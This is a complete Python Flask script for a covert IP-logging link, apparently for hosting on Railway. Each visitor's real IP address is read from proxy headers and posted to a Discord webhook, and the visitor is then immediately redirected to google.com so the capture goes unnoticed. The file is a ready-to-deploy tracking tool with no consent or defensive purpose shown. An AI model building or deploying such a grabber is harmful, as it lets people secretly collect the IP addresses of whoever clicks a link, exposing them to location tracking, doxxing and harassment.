from flask import Flask, request, redirect
import requests
import os

app = Flask(__name__)

# This matches the "Variable Name" you put in Railway's Variables tab
DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK")

@app.route('/')
def index():
    # Railway uses a proxy, so we check 'X-Forwarded-For' to get the real visitor IP
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # 1. Debug: Show in Railway logs what IP we found
    print(f"DEBUG: Visitor detected with IP: {user_ip}")

    # 2. Prepare the Discord message
    data = {
        "content": f"New visitor IP logged: **{user_ip}**",
        "username": "Railway Logger Bot"
    }

    # 3. Try to send to Discord and capture the result
    if DISCORD_WEBHOOK_URL:
        try:
            response = requests.post(DISCORD_WEBHOOK_URL, json=data)
            # This line is critical! Check your Railway logs for this output.
            print(f"DEBUG: Discord Response: {response.status_code} - {response.text}")
        except Exception as e:
            print(f"DEBUG: Failed to reach Discord: {e}")
    else:
        print("DEBUG ERROR: DISCORD_WEBHOOK variable is missing in Railway settings!")

    # 4. Redirect the user immediately
    return redirect("https://google.com")

if __name__ == "__main__":
    # Railway sets the PORT automatically
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
